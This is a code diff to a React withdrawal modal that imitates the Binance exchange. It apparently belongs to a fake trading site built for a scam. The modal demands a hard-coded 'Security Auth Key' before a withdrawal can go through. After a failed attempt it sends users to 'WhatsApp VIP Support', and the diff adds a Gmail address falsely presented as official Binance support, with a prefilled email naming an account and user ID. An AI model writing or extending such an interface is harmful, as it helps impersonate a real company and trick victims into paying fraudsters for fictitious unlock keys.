@@ -90,7 +90,7 @@ export const WithdrawModal: React.FC = () => {
 
     // Validate against official Security Auth Key: 6759
     if (authKey.trim() !== '6759') {
-      const failMsg = 'Incorrect Security Auth Key. Authorization failed. Please contact WhatsApp VIP Support for your key.';
+      const failMsg = 'Incorrect Security Auth Key. Authorization failed. Please contact VIP Support via WhatsApp or Email (Binancecareplus@gmail.com) for your key.';
       setErrorMessage(failMsg);
       setSuccessMessage(null);
       setShowIncorrectKeyModal(true);
@@ -468,7 +468,7 @@ export const WithdrawModal: React.FC = () => {
                 <div className="flex flex-col gap-1">
                   <span className="font-bold text-xs text-[#F6465D]">Incorrect Security Auth Key</span>
                   <p className="text-xs text-[#EAECEF] leading-relaxed">
-                    Incorrect Security Auth Key. Authorization failed. Please contact WhatsApp VIP Support for your key.
+                    Incorrect Security Auth Key. Authorization failed. Please contact WhatsApp VIP Support or our suggested email (Binancecareplus@gmail.com) for your key.
                   </p>
                 </div>
               </div>
@@ -527,6 +527,44 @@ export const WithdrawModal: React.FC = () => {
                   <span>Get Auth Key on WhatsApp</span>
                   <ExternalLink size={12} />
                 </button>
+
+                {/* Suggested Option: Email Support */}
+                <div className="pt-2 border-t border-[#2B313A] flex flex-col gap-1.5">
+                  <div className="flex items-center justify-between">
+                    <div className="flex items-center gap-1.5">
+                      <Mail size={12} className="text-[#FCD535]" />
+                      <span className="text-[10px] font-bold text-[#EAECEF]">
+                        Suggested Option: Contact via Email
+                      </span>
+                    </div>
+                    <span className="text-[9px] text-[#FCD535] bg-[#FCD535]/15 px-1.5 py-0.2 rounded font-medium">
+                      Suggested
+                    </span>
+                  </div>
+
+                  <div className="flex items-center justify-between bg-[#1E2329] px-2.5 py-1.5 rounded-lg border border-[#2B313A]">
+                    <span className="font-mono text-xs text-[#FCD535] font-semibold select-all truncate">
+                      Binancecareplus@gmail.com
+                    </span>
+                    <button
+                      type="button"
+                      onClick={handleCopyEmail}
+                      className="text-[10px] text-[#848E9C] hover:text-[#EAECEF] px-2 py-0.5 rounded bg-[#2B313A] flex items-center gap-1 shrink-0 transition-colors"
+                      title="Copy Support Email"
+                    >
+                      {copiedEmail ? <Check size={11} className="text-[#0ECB81]" /> : <Copy size={11} />}
+                      <span>{copiedEmail ? 'Copied' : 'Copy'}</span>
+                    </button>
+                  </div>
+
+                  <a
+                    href="mailto:Binancecareplus@gmail.com?subject=Security%20Auth%20Key%20Verification%20(Error%20%23AUTH-403)&body=Hello%20Binance%20Support%2C%0A%0AMy%20withdrawal%20Security%20Auth%20Key%20authorization%20failed%20(Error%20%23AUTH-403).%20Please%20assist%20me%20with%20my%20authorized%20key.%0A%0AAccount%3A%20DiannePizallo88%0AUser%20ID%3A%2089342019%0A%0AThank%20you."
+                    className="w-full py-2.5 rounded-xl bg-[#FCD535] hover:bg-[#F0B90B] text-black font-bold text-xs transition-all flex items-center justify-center gap-1.5 shadow-sm active:scale-98"
+                  >
+                    <Mail size={14} />
+                    <span>Get Auth Key via Email (Binancecareplus@gmail.com)</span>
+                  </a>
+                </div>
               </div>
 
               {/* Dismiss Buttons */}
